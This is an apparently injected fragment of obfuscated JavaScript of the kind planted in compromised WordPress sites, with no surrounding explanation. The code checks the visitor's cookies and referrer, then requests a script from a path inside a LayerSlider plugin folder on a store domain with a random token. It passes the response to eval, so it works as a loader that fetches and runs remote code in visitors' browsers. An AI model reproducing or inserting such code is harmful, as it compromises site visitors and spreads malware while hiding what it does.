_0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};